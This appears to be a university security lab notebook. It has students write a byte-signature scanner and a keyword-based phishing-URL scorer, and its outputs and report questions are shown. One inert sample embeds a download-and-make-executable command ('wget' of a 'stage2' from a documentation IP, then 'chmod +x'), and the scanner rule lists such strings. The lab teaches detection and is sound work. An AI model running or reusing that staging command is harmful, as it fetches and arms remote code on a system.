<a href="https://colab.research.google.com/github/nobtax/mac237-labs/blob/main/lab2/MAC237_LAB2_S07_Scanner_And_Phishing_Colab.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# MAC 237 Graded Lab 2, Session 7: a signature scanner and phishing-URL scoring

**Wednesday, October 7, 2026. This session runs in Google Colab, in a browser.**

B124 is not available to us on Wednesday evenings, so this is a notebook you can run on any
computer with a browser. It uses only the Python 3 standard library, opens no socket, and
reaches no network. Both parts are analysis of text: you read bytes and you read URLs. You
do not fetch or run anything.

**Nothing in this notebook contacts any host outside it.** The two byte samples in Part 1
are inert strings this notebook builds for itself, not programs, and the URLs in Part 2
use only reserved example and invalid names (RFC 2606) and documentation addresses
(RFC 5737). None of them resolves and none is a real site.

This is the detection half of the malware session. The Monday session built two small
programs and triaged them by hand. Here you write a rule that decides for you, run it, and
then find where the rule is wrong, which is the entire subject of signature detection.

## Section 1. Your personalization token

Put your own student ID in `sid` and run the cell. The token must be visible in the first
and the last screenshot of this session.

In [1]:
import hashlib, datetime

sid = '24521159'          # put your own student ID here, in quotes
stamp = datetime.datetime.now().strftime('%Y%m%d-%H%M')
TOKEN = hashlib.sha256((sid + '-' + stamp).encode()).hexdigest()[:16]
print('MAC237 Lab 2 token:', TOKEN)

MAC237 Lab 2 token: edf1854158f52235


## Section 5. Write your own scanner rule

A signature is a hypothesis about what a suspicious file contains. Below are two byte
samples this notebook builds for itself: a plain one that behaves like an ordinary report
generator, and a suspicious one whose text mentions fetching and running a second stage.
The suspicious sample is only a description in text, held as bytes; nothing in it runs.

Write one rule, run it against both, and see which it flags. Then find where the hypothesis
fails, in both directions.

In [2]:
# Two inert byte samples, built here so the notebook is self-contained.
# The 'suspicious' one merely contains text a downloader would mention; it is data, not code.
benign = (b'report generator v1.0\n'
          b'writing summary to report.txt\n'
          b'rows processed: 4021\n') + b'\x00' * 200

suspicious = (b'SIMULATION ONLY, nothing runs\n'
              b'would stage:   wget http://198.51.100.23/stage2 -O /tmp/.cache/stage2\n'
              b'would persist: chmod +x /tmp/.cache/stage2\n') + b'\x00' * 150

open('benign.sample', 'wb').write(benign)
open('suspicious.sample', 'wb').write(suspicious)
print('token:', TOKEN)
print('built two samples:', len(benign), 'and', len(suspicious), 'bytes')

token: edf1854158f52235
built two samples: 273 and 293 bytes


In [3]:
import hashlib

RULE = {'strings': [b'wget ', b'curl ', b'/tmp/', b'chmod +x'], 'min_size': 128}

def scan(path):
    data = open(path, 'rb').read()
    hits = [s.decode() for s in RULE['strings'] if s in data]
    flagged = len(data) >= RULE['min_size'] and bool(hits)
    digest = hashlib.sha256(data).hexdigest()[:16]
    return flagged, hits, len(data), digest

print('token:', TOKEN)
results = {}
for path in ('benign.sample', 'suspicious.sample'):
    flagged, hits, size, digest = scan(path)
    results[path] = flagged
    verdict = 'FLAG' if flagged else 'clean'
    print(f'{path:<18} sha256={digest} size={size:<5} hits={hits} verdict={verdict}')

assert results['suspicious.sample'] is True,  'the suspicious sample should flag'
assert results['benign.sample'] is False,     'the benign sample should stay clean'
print()
print('  CHECK PASS: the rule flags the suspicious sample and clears the benign one')

token: edf1854158f52235
benign.sample      sha256=4ef4dcdb863b1c9d size=273   hits=[] verdict=clean
suspicious.sample  sha256=d511a1624b1a583d size=293   hits=['wget ', '/tmp/', 'chmod +x'] verdict=FLAG

  CHECK PASS: the rule flags the suspicious sample and clears the benign one


In the report, for Section 5:

1. Which sample flagged, and exactly which string triggered it?
2. Name one concrete false positive this rule would produce on a normal Linux system, as a
   specific file rather than a category, and say why it would fire.
3. Name one change that would let the suspicious sample past the rule without changing what
   it describes. That one sentence is the whole story of signature detection.

**Screenshot** `lab2_s07_scanner.png`, showing one clean verdict and one FLAG verdict with
the strings that caused it, and your token.

## Section 6. Phishing-URL scoring

Every URL below is synthetic: reserved example and invalid names, and documentation
addresses. None resolves, none is real, and you do not visit any of them. The analysis is
lexical: you read the text of the URL, you do not fetch it. Run the cell and read the
ranked list.

In [4]:
import re

URLS = [
    'https://www.example.edu/library/hours',
    'https://mail.example.com/',
    'https://example.org/accounts/login',
    'https://portal.example.edu/student/registration',
    'http://192.0.2.45/secure/login/verify-account',
    'http://example-bank-verify-account.example.invalid/update/login',
    'https://free-gift-card-winner.example.invalid/claim.zip',
    'http://203.0.113.9/wp/bank-login-update-verify-account-confirm-now-please-hurry',
    'https://account-update-security-alert.example.invalid/login',
]

def score(u):
    points, why = 0, []
    if re.search(r'https?://\d+\.\d+\.\d+\.\d+', u):
        points += 3; why.append('bare IP address')
    if not u.startswith('https://'):
        points += 1; why.append('not HTTPS')
    if len(u) > 80:
        points += 1; why.append('very long')
    hits = [k for k in ('login', 'verify', 'update', 'account', 'secure',
                        'bank', 'free', 'win', 'claim') if k in u.lower()]
    points += len(hits)
    if hits:
        why.append('keywords ' + ','.join(hits))
    if u.count('-') > 3:
        points += 1; why.append('many hyphens')
    if any(t in u.lower() for t in ('.zip', '.mov', '.top', '.click')):
        points += 2; why.append('risky suffix')
    return points, '; '.join(why) or 'nothing notable'

ranked = sorted(((score(u)[0], u, score(u)[1]) for u in URLS), reverse=True)
print('token:', TOKEN)
for pts, url, why in ranked:
    print(f'{pts:>3}  {url}')
    print(f'     {why}')

benign_scored = [u for _, u, _ in ranked if 'example.edu' in u or 'example.org' in u]
assert ranked[0][0] >= 6,           'the worst URL should score high'
assert ranked[-1][0] <= 1,          'a plain library URL should score near zero'
print()
print('  CHECK PASS: the scored order separates the obvious lures from the plain URLs')

token: edf1854158f52235
 10  http://203.0.113.9/wp/bank-login-update-verify-account-confirm-now-please-hurry
     bare IP address; not HTTPS; keywords login,verify,update,account,bank; many hyphens
  8  http://192.0.2.45/secure/login/verify-account
     bare IP address; not HTTPS; keywords login,verify,account,secure
  6  http://example-bank-verify-account.example.invalid/update/login
     not HTTPS; keywords login,verify,update,account,bank
  5  https://free-gift-card-winner.example.invalid/claim.zip
     keywords free,win,claim; risky suffix
  3  https://account-update-security-alert.example.invalid/login
     keywords login,update,account
  2  https://example.org/accounts/login
     keywords login,account
  0  https://www.example.edu/library/hours
     nothing notable
  0  https://portal.example.edu/student/registration
     nothing notable
  0  https://mail.example.com/
     nothing notable

  CHECK PASS: the scored order separates the obvious lures from the plain URLs


## What goes in the report

Both `CHECK PASS` lines must appear above.

For Section 6:

1. Give the top five scored URLs.
2. One sentence defending the highest score.
3. One sentence on a benign URL that still scored above zero: name the rule that fired and
   what it costs an organization that blocks on this score. Then propose one rule you would
   add and one you would remove, with reasons.
4. Cite CTPE Chapter 6 on malicious software and phishing.

**Screenshot** `lab2_s07_phishing.png`, the ranked list with your token.

**Save and sign out, final commit for Lab 2.** Save the notebook to `lab2` with File, then
Save a copy in GitHub. Choose Runtime, then Disconnect and delete runtime, and sign out of
Google on a shared computer. Capture `lab2_s07_logout.png` with the token on screen. Upload
the three screenshots to `lab2`. Open your final commit on github.com and copy its address
onto the first page of your report; that report is the only file you submit.